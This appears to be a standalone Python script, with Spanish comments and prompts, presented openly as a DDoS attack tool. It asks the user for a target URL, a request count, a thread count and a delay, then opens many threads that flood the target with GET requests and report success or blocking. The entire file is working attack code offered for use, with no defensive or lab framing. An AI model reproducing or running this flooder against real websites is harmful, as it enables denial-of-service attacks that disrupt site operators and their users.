import requests
import threading
import os
import time
from colorama import Fore, Style
import socket
from colorama import init
from pyfiglet import Figlet

# Inicialización de colorama
os.system('color')
init()

# Función para el banner sin gradient-string
def show_banner():
    banner_text = '''
    ┏━━┓┏━━┓┏━┓┏━━┓  ┏━┓┏━┓┏━━┓
    ┗┓┓┃┗┓┓┃┃┃┃┃━━┫  ┃╋┃┃┃┃┗┓┏┛
    ┏┻┛┃┏┻┛┃┃┃┃┣━━┃  ┃┏┛┃┃┃░┃┃░
    ┗━━┛┗━━┛┗━┛┗━━┛  ┗┛░┗━┛░┗┛░
    '''
    # Uso de colores para el banner
    print(Fore.CYAN + Figlet(font='slant').renderText(banner_text) + Style.RESET_ALL)

# Obtener la IP del servidor
def get_server_ip(url):
    try:
        return socket.gethostbyname(url.replace("https://", "").replace("http://", "").split("/")[0])
    except socket.gaierror:
        return "IP desconocida"

# Pedir la URL del objetivo
def get_target_url():
    print(f"{Fore.CYAN}Introduce la URL objetivo para el ataque DDoS:{Style.RESET_ALL}")
    return input("URL: ")

# Pedir el número de solicitudes, hilos y tiempo de espera
def get_attack_parameters():
    print(f"{Fore.CYAN}Introduce el número de solicitudes:{Style.RESET_ALL}")
    num_requests = int(input("Número de solicitudes: "))
    
    print(f"{Fore.CYAN}Introduce el número de hilos:{Style.RESET_ALL}")
    num_threads = int(input("Número de hilos: "))
    
    print(f"{Fore.CYAN}Introduce el tiempo de espera entre solicitudes (en segundos):{Style.RESET_ALL}")
    delay = float(input("Tiempo de espera: "))
    
    return num_requests, num_threads, delay

# Realiza las solicitudes GET al servidor objetivo
def send_request(url, delay, server_ip):
    for _ in range(num_requests):
        try:
            # Enviar petición GET al servidor
            response = requests.get(url)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Solicitud exitosa, el servidor la aceptó. IP del servidor: {Fore.YELLOW}{server_ip}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Solicitud fallida, el servidor no la aceptó. IP del servidor: {Fore.YELLOW}{server_ip}{Style.RESET_ALL}")
        except requests.exceptions.RequestException as e:
            if "403" in str(e):
                print(f"{Fore.RED}[!]{Style.RESET_ALL} Solicitud fallida, bloqueado por el servidor. IP del servidor: {Fore.YELLOW}{server_ip}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Error en la solicitud: {e}")
        time.sleep(delay)  # Tiempo de espera entre solicitudes

# Función principal para ejecutar el ataque DDoS
def start_ddos_attack(url, num_threads, delay):
    server_ip = get_server_ip(url)
    threads = []
    
    for _ in range(num_threads):
        t = threading.Thread(target=send_request, args=(url, delay, server_ip))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

# Ejecuta el script
if __name__ == "__main__":
    # Mostrar el banner
    show_banner()
    
    # Pedir la URL objetivo
    target_url = get_target_url()

    # Pedir los parámetros del ataque
    num_requests, num_threads, delay = get_attack_parameters()

    # Iniciar el ataque
    print(f"{Fore.CYAN}Iniciando ataque DDoS con {num_threads} hilos y {num_requests} solicitudes...{Style.RESET_ALL}")
    time.sleep(1)
    
    start_ddos_attack(target_url, num_threads, delay)
